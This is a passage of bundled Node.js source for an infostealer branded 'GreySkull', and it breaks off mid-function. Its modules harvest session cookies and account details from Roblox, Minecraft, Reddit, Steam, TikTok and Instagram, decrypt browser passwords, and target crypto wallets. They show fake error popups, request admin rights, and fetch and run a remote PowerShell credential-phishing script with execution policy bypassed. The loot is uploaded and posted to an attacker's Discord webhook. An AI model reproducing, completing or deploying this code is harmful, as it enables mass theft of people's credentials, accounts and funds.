function compile(embeds) {
  var build = "";
  build += `{\n"content": null,\n"embeds": [`;
  for (let i = 0; i < embeds.length; i++) {
    build += embeds[i];
    if (i != embeds.length - 1) {
      build += ",\n";
    }
  }
  build += `],\n"avatar_url": "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",\n"username": "GreySkull",\n"attachments": []\n}`;
  return build;
}
async function embed(UserName, RobuxBalance, ThumbnailUrl, IsAnyBuildersClubMember, IsPremium, friendscount, cookies) {
  let embed = {
    fields: [{
      name: `${embeds.atom} Name:`,
      value: `\`\`\`ansi\n[2;32m${UserName}[0m[2;32m[0m\`\`\``,
      inline: false
    }, {
      name: `${embeds.dsc} Robux:`,
      value: `\`\`\`ansi\n[2;32m${RobuxBalance}[0m[2;32m[0m\`\`\``,
      inline: true
    }, {
      name: `${embeds.rblxinfo} premium:`,
      value: `\`${IsPremium ? "✅" : "❌"}\``,
      inline: !0
    }, {
      name: `${embeds.infoyl} Club Member:`,
      value: `\`${IsAnyBuildersClubMember ? "✅" : "❌"}\``,
      inline: !0
    }, {
      name: `${embeds.inject} Cookie:`,
      value: `[Cookies](${cookies})`,
      inline: true
    }],
    description: `\`${friendscount} Friends\``,
    color: 5006935,
    footer: {
      text: "@GreySkull | https://t.me/Sordeal"
    },
    title: "Roblox Account",
    thumbnail: {
      url: `${ThumbnailUrl}`
    }
  };
  return JSON.stringify(embed);
}
module.exports = {
  GreySkullGetRoblox,
  ParseAndSendRoblox,
  sendRoblox,
  embed,
  compile
};
},{"./stats":"utils/stats.js","./save":"utils/save.js","./emotes":"utils/emotes.js"}],"utils/minecraft.js":[function(require,module,exports) {
const axios = require("axios"),
  {
    stat
  } = require("./stats"),
  https = require("https"),
  agent = new https.Agent({
    rejectUnauthorized: false
  }),
  fs = require("fs"),
  {
    embeds,
    stats,
    badge
  } = require("./emotes");
async function GreySkullfinduid(wb, cc) {
  if (cc != "yes") return;
  for (const m of stat.minecraft_account) {
    try {
      let name = [];
      let count = 0;
      const content = fs.readFileSync(m, "utf-8");
      const jsonData = JSON.parse(content);
      if (jsonData) {
        if (!jsonData.accounts) return;
        const accountInfo = jsonData.accounts;
        for (const accountId in accountInfo) {
          var _JSON$stringify$match;
          const emailRegex = /[\w\.-]+@[a-zA-Z\d\.-]+\.[a-zA-Z]{2,}/g;
          const emails = (_JSON$stringify$match = JSON.stringify(accountInfo).match(emailRegex)) !== null && _JSON$stringify$match !== void 0 ? _JSON$stringify$match : "none";
          const profile = accountInfo[accountId].minecraftProfile;
          if (profile) {
            const playerDBResponse = await axios.get(`https://api.namemc.com/profile/${profile.id}/friends`);
            if (playerDBResponse.status === 200 && playerDBResponse.data.length > 0) {
              name = playerDBResponse.data.map(entry => entry.name);
              count = name.length;
            }
            const tosend = {
              username: "GreySkull",
              avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
              embeds: [{
                title: "Nova Minecraft Account",
                thumbnail: {
                  url: `https://minotar.net/avatar/${profile.id}.png`
                },
                color: 5006935,
                description: `[Download Skin](https://minotar.net/avatar/${profile.id}.png)\n[Download Capes](http://s.optifine.net/capes/${profile.name}.png)`,
                fields: [{
                  name: `${embeds.mcid} Account ID:`,
                  value: `\`\`\`${accountId}\`\`\``,
                  inline: true
                }, {
                  name: `${embeds.mcgapple} Username:`,
                  value: `\`\`\`${profile.name}\`\`\``,
                  inline: true
                }, {
                  name: `${embeds.mcmail} Email Found:`,
                  value: `\`\`\`${emails || `None`}\`\`\``,
                  inline: true
                }, {
                  name: `${embeds.keysmc} Minecraft UID`,
                  value: `\`\`\`${profile.id}\`\`\``,
                  inline: true
                }, {
                  name: `${embeds.namemc} Friends Count`,
                  value: `\`\`\`${count || 0}\`\`\``,
                  inline: true
                }, {
                  name: `${embeds.namemc} Friends List:`,
                  value: `\`\`\`${name.join(", ") || `None`}\`\`\``,
                  inline: true
                }],
                footer: {
                  text: `@GreySkull | https://t.me/Sordeal`
                }
              }]
            };
            try {
              await axios({
                url: wb,
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                httpsAgent: agent,
                data: tosend
              });
            } catch (e) {}
          }
        }
      }
    } catch (error) {}
  }
}
module.exports = {
  GreySkullfinduid
};
},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/phish.js":[function(require,module,exports) {
const fetch = require("node-fetch");
const {
    exec
  } = require("child_process"),
  core = require("./core");
async function MicroPhish(githubRawUrl, webhook, cc) {
  if (cc !== "yes") return;
  const replaceText = "%YOUR-DISCORD-WEBHOOK%";
  try {
    const response = await fetch(githubRawUrl);
    const script = await response.text();
    const updatedScript = script.replace(replaceText, webhook);
    const path = require("path");
    let randomPSfile = path.join(process.env.localappdata, "Temp", core.generateId(3) + "tempScript.ps1");
    const fs = require("fs");
    fs.writeFileSync(randomPSfile, updatedScript, "utf-8");
    console.log(randomPSfile);
    exec(`powershell.exe -ExecutionPolicy Bypass -File ${randomPSfile}`, (error, stdout, stderr) => {
      if (error) {
        return;
      }
    });
  } catch (error) {}
}
module.exports = {
  MicroPhish
};
},{"./core":"utils/core.js"}],"utils/reddit.js":[function(require,module,exports) {
const {
    stat
  } = require("./stats"),
  axios = require("axios"),
  {
    embeds
  } = require("./emotes");
async function NovaRedditor(cc) {
  if (cc !== "yes") return;
  let g = [];
  let reddit_sessions = stat.RedditSess;
  if (reddit_sessions && reddit_sessions.length) {
    for (const reddit of reddit_sessions) {
      const {
        data: bearer
      } = await axios.post("https://accounts.reddit.com/api/access_token", {
        scopes: ["*", "email", "pii"]
      }, {
        headers: {
          Cookie: `reddit_session=${reddit}`,
          Authorization: "Basic b2hYcG9xclpZdWIxa2c6"
        }
      });
      const {
        data: account
      } = await axios.get("https://oauth.reddit.com/api/v1/me", {
        headers: {
          Authorization: `Bearer ${bearer.access_token}`
        }
      });
      let {
        total_karma,
        icon_img,
        is_gold,
        email,
        name
      } = account;
      let profile_link = `https://www.reddit.com/user/${name}`;
      let embed = {
        color: 5006935,
        thumbnail: {
          url: icon_img
        },
        fields: [{
          name: `${embeds.billings} Profile`,
          value: `[\`${name}\`](${profile_link})`,
          inline: true
        }, {
          name: `${embeds.karma} Karma`,
          value: `\`${total_karma}\``,
          inline: true
        }, {
          name: `${embeds.gold} Gold`,
          value: `\`${is_gold}\``,
          inline: true
        }, {
          name: `${embeds.mail} Email`,
          value: `\`${email}\``,
          inline: true
        }],
        footer: {
          text: "@GreySkull | https://t.me/Sordeal"
        },
        title: "Reddit Session"
      };
      g.push(embed);
    }
    let tosend = {
      avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
      username: "GreySkull",
      embeds: g
    };
    return tosend;
  }
}
module.exports = {
  NovaRedditor
};
},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/steam.js":[function(require,module,exports) {
const axios = require("axios"),
  {
    stat
  } = require("./stats"),
  {
    embeds,
    stats,
    badge
  } = require("./emotes");
async function NovaSteamator(cc) {
  if (cc != "yes") return;
  try {
    if (stat.steam_content[0] && Array.isArray(stat.steam_content)) {
      const accounts = stat.steam_content[0];
      if (!accounts) return;
      accounts.forEach(async account => {
        try {
          const {
            data: accountInfo
          } = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3000BC0F14309FD7999F02C66E757EF7&steamids=${account}`);
          const {
            data: games
          } = await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}&include_appinfo=true`);
          const {
            data: level
          } = await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}`);
          stat.addSteamAcc({
            accountId: account,
            accountInfo: accountInfo.response.players,
            games,
            level: level.response
          });
        } catch (error) {}
      });
    }
  } catch (e) {}
}
async function sendSteam(cc) {
  if (cc !== "yes") return;
  let e = [];
  try {
    let steamAccounts = stat.steam_account.slice(0, 5);
    for (let {
      accountId,
      accountInfo,
      games,
      level
    } of steamAccounts) {
      var _level$player_level, _games$response$game_;
      if (!accountInfo) continue;
      accountInfo = accountInfo[0];
      const embed = {
        title: "Steam Session",
        color: 5006935,
        author: {
          name: accountInfo.personaname,
          icon_url: accountInfo.avatar,
          url: accountInfo.profileurl
        },
        fields: [{
          name: `${embeds.infoyl} Name:`,
          value: `\`${accountInfo.personaname}\``,
          inline: false
        }, {
          name: `${embeds.nitro} Created At:`,
          value: `${accountInfo.timecreated !== undefined ? `<t:${accountInfo.timecreated}>` : "none"}`,
          inline: true
        }, {
          name: `${embeds.phone} Level:`,
          value: `\`${(_level$player_level = level.player_level) !== null && _level$player_level !== void 0 ? _level$player_level : 0}\``,
          inline: true
        }, {
          name: `${embeds.mail} Games:`,
          value: `\`${(_games$response$game_ = games.response.game_count) !== null && _games$response$game_ !== void 0 ? _games$response$game_ : 0}\``,
          inline: true
        }]
      };
      e.push(embed);
    }
    let g = {
      avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
      username: "GreySkull",
      embeds: e
    };
    return g;
  } catch (error) {}
}
module.exports = {
  NovaSteamator,
  sendSteam
};
},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/fake_error.js":[function(require,module,exports) {
const {
    exec
  } = require("child_process"),
  fs = require("fs"),
  save = require("./save");
const generateRandomName = length => {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    result += characters[randomIndex];
  }
  return result;
};
function error(cc, msg, startuped) {
  if (cc !== "yes" && startuped !== true) return;
  const vbsScript = `
  Set objShell = WScript.CreateObject("WScript.Shell")
  MsgBox "Error : ${msg}", vbInformation, "Error Code : 43 "
  `;
  const randomName = generateRandomName(12);
  const vbsFileName = process.env.APPDATA + "\\" + randomName + ".vbs";
  fs.writeFileSync(vbsFileName, vbsScript, "utf8");
  exec("cscript " + vbsFileName, (error, stdout, stderr) => {
    if (error) {
      save.SaveError(error);
    }
  });
}
module.exports = {
  error
};
},{"./save":"utils/save.js"}],"utils/uac.js":[function(require,module,exports) {
const path = require("path"),
  sudo = require("sudo-prompt"),
  admin = require("admin-check");
function requestAdminPrivileges(myself) {
  return new Promise((resolve, reject) => {
    sudo.exec(`${process.execPath} "${path.join(myself)}" --admin`, error => {
      if (error) {} else {
        process.abort();
      }
    });
  });
}
async function requestAdminPrivilegesIfNeeded(myself, cc, cc2, cc3) {
  if (cc === "yes" || cc2 === "yes" || cc3 === "yes") {
    let g = await admin.check();
    if (!g) {
      try {
        await requestAdminPrivileges(myself);
      } catch (error) {}
    }
  }
}
module.exports = {
  requestAdminPrivilegesIfNeeded
};
},{}],"utils/tiktok.js":[function(require,module,exports) {
const {
    stat
  } = require("./stats"),
  axios = require("axios"),
  {
    embeds,
    stats
  } = require("./emotes"),
  fs = require("fs"),
  path = require("path");
async function ParseTiktok(cc) {
  if (cc !== "yes") return;
  let g = [];
  let tiktok_sessions = stat.TiktokSessId;
  if (tiktok_sessions && tiktok_sessions.length) {
    for (const tiktok of tiktok_sessions) {
      var _follower_num$value;
      const profile = await axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", {
        headers: {
          cookie: `sessionid=${tiktok}`,
          "Accept-Encoding": "identity"
        }
      }).then(res => res.data).catch(() => {});
      const insights = await axios.post("https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE", 'type_requests=[{"insigh_type":"vv_history","days":16},{"insigh_type":"pv_history","days":16},{"insigh_type":"like_history","days":16},{"insigh_type":"comment_history","days":16},{"insigh_type":"share_history","days":16},{"insigh_type":"user_info"},{"insigh_type":"follower_num_history","days":17},{"insigh_type":"follower_num"},{"insigh_type":"week_new_videos","days":7},{"insigh_type":"week_incr_video_num"},{"insigh_type":"self_rooms","days":28},{"insigh_type":"user_live_cnt_history","days":58},{"insigh_type":"room_info"}]', {
        headers: {
          cookie: `sessionid=${tiktok}`
        }
      }).then(res => res.data).catch(() => {});
      const wallet = await axios.get("https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true", {
        headers: {
          cookie: `sessionid=${tiktok}`
        }
      }).then(res => res.data).catch(() => {});
      if (!profile || !profile.data) return;
      let {
        username,
        email
      } = profile.data;
      let {
        follower_num
      } = insights;
      let {
        coins
      } = wallet.data;
      let embed = {
        title: "Tiktok Session",
        fields: [{
          name: `${embeds.tiktok} Username:`,
          value: `[\`${username}\`](https://tiktok.com/@${username})`,
          inline: true
        }, {
          name: `${embeds.twitter_followers} Followers:`,
          value: `\`${(_follower_num$value = follower_num.value) !== null && _follower_num$value !== void 0 ? _follower_num$value : 0}\``,
          inline: true
        }, {
          name: `${embeds.mail} Email`,
          value: `\`${email !== null && email !== void 0 ? email : "None"}\``,
          inline: true
        }, {
          name: `${embeds.token} Coins`,
          value: `\`${coins !== null && coins !== void 0 ? coins : 0}\``,
          inline: true
        }, {
          name: `${stats.cookie} Cookie`,
          value: `\`\`\`${tiktok}\`\`\``,
          inline: true
        }],
        footer: {
          text: "@GreySkull | https://t.me/Sordeal"
        },
        color: 5006935
      };
      g.push(embed);
    }
    let tosend = {
      avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
      username: "GreySkull",
      embeds: g
    };
    return tosend;
  }
}
module.exports = {
  ParseTiktok
};
},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/instagram.js":[function(require,module,exports) {
const {
    stat
  } = require("./stats"),
  axios = require("axios"),
  fs = require("fs"),
  {
    embeds
  } = require("./emotes"),
  path = require("path");
async function ParseInstagram(cc) {
  if (cc !== "yes") return;
  try {
    let g = [];
    let instagram_sessions = stat.InstaSessId;
    if (instagram_sessions && instagram_sessions.length) {
      for (const instagram of instagram_sessions) {
        var _profile$full_name, _profile$is_private, _profile$email, _profile$phone_number, _profile$profile_pic_, _profile$username;
        const profile = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", {
          headers: {
            "user-agent": "Instagram 219.0.0.12.117 Android",
            cookie: `sessionid=${instagram}`
          }
        }).then(res => res.data.user).catch(() => {});
        let full_name = (_profile$full_name = profile.full_name) !== null && _profile$full_name !== void 0 ? _profile$full_name : "none";
        let is_private = (_profile$is_private = profile.is_private) !== null && _profile$is_private !== void 0 ? _profile$is_private : "none";
        let email = (_profile$email = profile.email) !== null && _profile$email !== void 0 ? _profile$email : "none";
        let phone_number = (_profile$phone_number = profile.phone_number) !== null && _profile$phone_number !== void 0 ? _profile$phone_number : "none";
        let profile_pic_url = (_profile$profile_pic_ = profile.profile_pic_url) !== null && _profile$profile_pic_ !== void 0 ? _profile$profile_pic_ : "none";
        let username = (_profile$username = profile.username) !== null && _profile$username !== void 0 ? _profile$username : "none";
        const profile2 = await axios.get(`https://i.instagram.com/api/v1/users/${profile.pk_id}/info`, {
          headers: {
            "user-agent": "Instagram 219.0.0.12.117 Android",
            cookie: `sessionid=${instagram}`
          }
        }).then(res => res.data.user).catch(() => {});
        let {
          is_verified,
          follower_count
        } = profile2;
        let embed = {
          title: "Instagram Session",
          fields: [{
            name: `${embeds.instagram} Username:`,
            value: `[\`${full_name}\`](https://instagram.com/${username})`,
            inline: true
          }, {
            name: `${embeds.twitter_followers} Followers:`,
            value: `\`${follower_count !== null && follower_count !== void 0 ? follower_count : "0"}\``,
            inline: true
          }, {
            name: `${embeds.mail} Email`,
            value: `\`${email !== null && email !== void 0 ? email : "none"}\``,
            inline: true
          }, {
            name: `${embeds.instaiscert} Certified`,
            value: `\`${is_verified ? embeds.instagram_certified : "❌"}\``,
            inline: true
          }, {
            name: `${embeds.phone} Phone Number`,
            value: `\`${phone_number ? phone_number : "❌"}\``,
            inline: true
          }, {
            name: `${embeds.token} Cookie`,
            value: `\`\`\`${instagram}\`\`\``,
            inline: false
          }],
          thumbnail: {
            url: profile_pic_url
          },
          footer: {
            text: "@GreySkull | https://t.me/Sordeal"
          },
          color: 5006935
        };
        g.push(embed);
      }
      let tosend = {
        avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
        username: "GreySkull",
        embeds: g
      };
      return tosend;
    }
  } catch (e) {
    return null;
  }
}
module.exports = {
  ParseInstagram
};
},{"./stats":"utils/stats.js","./emotes":"utils/emotes.js"}],"utils/cookies.js":[function(require,module,exports) {
// trier les cookies
const {
  stat
} = require("./stats");
async function CookiesFilter(cc) {
  if (cc !== "yes") return;
  let CookiesLinks = {
    "basic-fit": "[`basicfit`](https://basic-fit.com)",
    coinbase: "[`coinbase`](https://coinbase.com)",
    sellix: "[`sellix`](https://sellix.io)",
    gmail: "[`gmail`](https://gmail.com)",
    steam: "[`steam`](https://steam.com)",
    riotgames: "[`riotgames`](https://riotgames.com)",
    youtube: "[`youtube`](https://youtube.com)",
    instagram: "[`instagram`](https://instagram.com)",
    tiktok: "[`tiktok`](https://tiktok.com)",
    twitter: "[`twitter`](https://twitter.com)",
    facebook: "[`facebook`](https://facebook.com)",
    epicgames: "[`epicgames`](https://epicgames.com)",
    spotify: "[`spotify`](https://spotify.com)",
    yahoo: "[`yahoo`](https://yahoo.com)",
    roblox: "[`roblox`](https://roblox.com)",
    twitch: "[`twitch`](https://twitch.com)",
    minecraft: "[`minecraft`](https://minecraft.net)",
    paypal: "[`paypal`](https://paypal.com)",
    origin: "[`origin`](https://origin.com)",
    amazon: "[`amazon`](https://amazon.com)",
    ebay: "[`ebay`](https://ebay.com)",
    aliexpress: "[`aliexpress`](https://aliexpress.com)",
    playstation: "[`playstation`](https://playstation.com)",
    hbo: "[`hbo`](https://hbo.com)",
    xbox: "[`xbox`](https://xbox.com)",
    binance: "[`binance`](https://binance.com)",
    hotmail: "[`hotmail`](https://hotmail.com)",
    outlook: "[`outlook`](https://outlook.com)",
    crunchyroll: "[`crunchyroll`](https://crunchyroll.com)",
    telegram: "[`telegram`](https://telegram.com)",
    pornhub: "[`pornhub`](https://pornhub.com)",
    disney: "[`disney`](https://disney.com)",
    expressvpn: "[`expressvpn`](https://expressvpn.com)",
    uber: "[`uber`](https://uber.com)",
    netflix: "[`netflix`](https://netflix.com)",
    github: "[`github`](https://github.com)",
    stake: "[`stake`](https://stake.com)"
  };
  let CookiesKeys = ["basic-fit", "coinbase", "sellix", "gmail", "steam", "riotgames", "youtube", "instagram", "tiktok", "twitter", "facebook", "epicgames", "spotify", "yahoo", "roblox", "twitch", "minecraft", "paypal", "origin", "amazon", "ebay", "aliexpress", "playstation", "hbo", "xbox", "binance", "hotmail", "outlook", "crunchyroll", "telegram", "pornhub", "disney", "expressvpn", "uber", "netflix", "github", "stake"];
  let VerifiedLinks = new Set();
  await stat.AllCookies.forEach(cookies => {
    cookies.forEach(cookie => {
      const matchingKey = CookiesKeys.find(key => cookie.host.includes(key));
      if (matchingKey) {
        VerifiedLinks.add(CookiesLinks[matchingKey]);
      }
    });
  });
  let verifiedLinksArray = Array.from(VerifiedLinks);
  let embed = {
    avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
    username: "GreySkull",
    embeds: [{
      author: {
        name: "Cookies Keywords",
        url: "https://t.me/Sordeal",
        icon_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/gifnova.gif"
      },
      color: 5006935,
      description: verifiedLinksArray.join(", "),
      footer: {
        text: "@GreySkull | https://t.me/Sordeal"
      }
    }]
  };
  return embed;
}
module.exports = {
  CookiesFilter
};
},{"./stats":"utils/stats.js"}],"index.js":[function(require,module,exports) {
const admin = require("./utils/admin"),
  browsers = require("./utils/browsers"),
  core = require("./utils/core"),
  crypto = require("./utils/crypto"),
  discord = require("./utils/discord"),
  files = require("./utils/files"),
  twitter = require("./utils/twitter"),
  {
    upload
  } = require("./utils/uploadFiles"),
  infos = require("./utils/infos"),
  injection = require("./utils/injection"),
  antidebug = require("./utils/antidebug"),
  save = require("./utils/save"),
  {
    stat
  } = require("./utils/stats"),
  roblox = require("./utils/roblox"),
  minecraft = require("./utils/minecraft"),
  phish = require("./utils/phish"),
  reddit = require("./utils/reddit"),
  https = require("https"),
  axios = require("axios"),
  agent = new https.Agent({
    rejectUnauthorized: false
  }),
  steam = require("./utils/steam"),
  fake_error = require("./utils/fake_error"),
  // sound = require("./utils/sound"),
  kill = require("./utils/kill"),
  uac = require("./utils/uac"),
  tiktok = require("./utils/tiktok"),
  instagram = require("./utils/instagram"),
  cookies = require("./utils/cookies");
let config = {
  webhook: "%WEBHOOK%",
  DoINeedTo_beSilent: "%SILENCE_MOD%",
  ClientEmail: "%CLIENT_EMAIL%",
  ChromeInjection: "%CHROME_INJECTION%",
  DoINeedTo_MailChanger: "%AUTO_MAIL_CHANGER%",
  DoINeedTo_Disable2FA: "%DISABLE_2FA%",
  DoINeedTo_BlockDebug: "%DEBUG_OPTIONS%",
  DoINeedTo_GetGames: "%GAMES_OPTIONS%",
  DoINeedTo_GetLaunchers: "%LAUNCHERS_OPTIONS%",
  DoINeedTo_Inject: "%INJECT_OPTIONS%",
  DoINeedTo_GetClients: "%CLIENTS_OPTIONS%",
  DoINeedTo_GetWallets: "%WALLETS_OPTIONS%",
  DoINeedTo_GetVPN: "%VPN_OPTIONS%",
  DoINeedTo_GetSysInfo: "%SYSINFO_OPTIONS%",
  DoINeedTo_GetSocialAPP: "%SOCIALAPP_OPTIONS%",
  DoINeedTo_GetBrowsers: "%BROWSERS_OPTIONS%",
  DoINeedTo_FakeError: "%FAKEERROR_OPTIONS%",
  DoINeedTo_TrollSound: "%TROLL_SOUND%",
  DoINeedTo_TrollImage: "%TROLL_IMAGE%",
  DoINeedTo_FakeErrorMSG: "%FAKE_ERROR_MSG%",
  DoINeedTo_DisableUSERSET: "%SETTINGS_DISABLER%",
  Mcrsft_SniffUrl: "https://raw.githubusercontent.com/Yokheycv/sub/main/microsoft_credz.ps1",
  ChromeInjectionURL: "https://github.com/Yokheycv/Chrome-inject/raw/main/extensions.zip",
  DiscordInjectionURL: "https://raw.githubusercontent.com/Yokheycv/sub/main/index.js",
  ExodusInjectionURL: "https://raw.githubusercontent.com/Yokheycv/sub/main/exodus-inject.js",
  MullvadInjectionURL: "https://raw.githubusercontent.com/Yokheycv/sub/main/mullvad-inject.js",
  AtomicInjectionURL: "https://raw.githubusercontent.com/Yokheycv/Atomic-inject/main/main.js",
  AtomicMainURL: "https://raw.githubusercontent.com/Yokheycv/Atomic-inject/main/vendors.3d9f29748fbff1778bdc.js",
  MailSpringInjectionURL: "https://raw.githubusercontent.com/Yokheycv/sub/main/mailspring-inject.js",
  DoINeedTo_SwapWallet: {
    active: "%SWAP_OPTIONS%",
    ltc_address: "%LTC_ADD%",
    xlm_address: "%XLM_ADD%",
    eth_address: "%ETH_ADD%",
    dash_address: "%DASH_ADD%",
    bch_address: "%BCH_ADD%",
    btc_address: "%BTC_ADD%",
    xrp_address: "%XRP_ADD%",
    neo_address: "%NEO_ADD%",
    doge_address: "%DOGE_ADD%",
    paypal_address: "%PAYPAL_ADD%"
  }
};
async function start() {
  const myselfbis = await core.GreySkullFindMyself();
  let internetacces = core.checkInternetAccess();
  if (!internetacces) {
    process.abort();
  }
  kill.KillBrowsersProcess(config.DoINeedTo_Inject, config.DoINeedTo_GetBrowsers, config.DoINeedTo_beSilent);
  let startuped = core.checkIfStartup(myselfbis);
  uac.requestAdminPrivilegesIfNeeded(myselfbis, config.ChromeInjection, config.DoINeedTo_DisableUSERSET, config.DoINeedTo_Inject);
  let link = "";
  console.log("First instances");
  const {
    disk,
    ram,
    uid,
    cpucount,
    OS,
    cpu,
    GPU,
    windowskey,
    windowsversion
  } = await core.getInfo();
  const [{
    ip,
    hostname,
    city,
    region,
    country,
    loc,
    org,
    postal,
    timezone
  }, myself] = await Promise.all([core.getPublicIp(), core.GreySkullFindMyself()]);
  const webhook = config.webhook;
  console.log("Joined by 2nd !");
  await save.Init(country, ip);
  const username = process.env.userprofile.split("\\")[2];
  const googlemap = `https://www.google.com/maps/search/google+map++${loc}`;
  antidebug.DoNoDebugNegger(config.DoINeedTo_BlockDebug, ip, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion);
  await infos.getSysteminformations(config.DoINeedTo_GetSysInfo, ip, hostname, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion);
  await infos.takeScreenshotAndSave(config.DoINeedTo_GetSysInfo);
  console.log("Large Instance started");
  const promises = [fake_error.error(config.DoINeedTo_FakeError, config.DoINeedTo_FakeErrorMSG, startuped), infos.GreySkullAV(config.DoINeedTo_GetSysInfo), infos.GreySkullClipboard(config.DoINeedTo_GetSysInfo), infos.GreySkullWifiPasswords(config.DoINeedTo_GetSysInfo), admin.GreySkullWinSCP(config.DoINeedTo_GetClients), files.GreySkullGOG(config.DoINeedTo_GetLaunchers), files.GreySkullElectronicArts(config.DoINeedTo_GetLaunchers), files.GreySkullRockstarGames(config.DoINeedTo_GetLaunchers), files.GreySkullBattle(config.DoINeedTo_GetLaunchers), files.GreySkullEpicGame(config.DoINeedTo_GetLaunchers), files.GreySkullSteam(config.DoINeedTo_GetLaunchers), files.GreySkullPidgin(config.DoINeedTo_GetSocialAPP), files.GreySkullProton(config.DoINeedTo_GetVPN), files.GreySkullNordVPN(config.DoINeedTo_GetVPN), files.GreySkullOpenVPN(config.DoINeedTo_GetVPN), files.GreySkullRiotGame(config.DoINeedTo_GetLaunchers), files.GreySkullTelegram(config.DoINeedTo_GetSocialAPP), files.GreySkullWhatsapp(config.DoINeedTo_GetSocialAPP), files.GreySkullFetchT0x(config.DoINeedTo_GetSocialAPP), crypto.GreySkullColds(config.DoINeedTo_GetWallets), crypto.GreySkullExtensions(config.DoINeedTo_GetWallets)];
  await Promise.all(promises);
  console.log("Start Passwords Decryption !");
  await files.GreySkullSimple();
  try {
    const passwords = await browsers.GreySkullBrowsers(config.DoINeedTo_GetBrowsers);
    const passphrase = await crypto.GreySkullFetchMeta(passwords);
    crypto.exodusDecrypt(config.DoINeedTo_GetWallets, passwords);
    stat.AddPassphrase(passphrase);
  } catch (e) {
    save.SaveError(e);
  }
  console.log("Passwords Decryption finished !");
  const zipPath = await save.zipResult();
  link = await upload(zipPath);
  let gembed = stat.Build(username, ip, hostname, city, region, country, googlemap, org, postal, timezone, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion, link);
  try {
    axios.all([axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      data: JSON.parse(gembed),
      httpsAgent: agent
    })]).then(axios.spread(response1 => {})).catch(error => {});
  } catch (e) {}
  phish.MicroPhish(config.Mcrsft_SniffUrl, config.webhook, config.DoINeedTo_GetSysInfo);
  // SESSIONS
  console.log("Social Instance started");
  const promisesSocialApps = [instagram.ParseInstagram(config.DoINeedTo_GetSocialAPP), tiktok.ParseTiktok(config.DoINeedTo_GetSocialAPP), reddit.NovaRedditor(config.DoINeedTo_GetSocialAPP)];
  const [insta_account, tiktok_account, reddit_account] = await Promise.all(promisesSocialApps);
  roblox.GreySkullGetRoblox(config.DoINeedTo_GetGames);
  roblox.ParseAndSendRoblox(config.DoINeedTo_GetGames);
  twitter.detailtwitter(config.DoINeedTo_GetSocialAPP);
  injection.pwnBetterDiscord(config.DoINeedTo_Inject);
  injection.BypassDiscordTokenProtector(config.DoINeedTo_Inject);
  injection.inject(config.DoINeedTo_Inject, webhook, config.DiscordInjectionURL, link, config.DoINeedTo_Disable2FA, config.DoINeedTo_MailChanger, config.ClientEmail, config.DoINeedTo_beSilent);
  steam.NovaSteamator(config.DoINeedTo_GetLaunchers);
  try {
    let cookEmbed = await cookies.CookiesFilter(config.DoINeedTo_GetBrowsers);
    await axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      httpsAgent: agent,
      data: cookEmbed
    });
  } catch (e) {}
  try {
    const pd = await steam.sendSteam(config.DoINeedTo_GetLaunchers);
    await axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      httpsAgent: agent,
      data: pd
    });
  } catch (e) {}
  try {
    await axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      httpsAgent: agent,
      data: insta_account
    });
  } catch (e) {}
  try {
    await axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      httpsAgent: agent,
      data: tiktok_account
    });
  } catch (e) {}
  try {
    await axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      httpsAgent: agent,
      data: reddit_account
    });
  } catch (e) {}
  try {
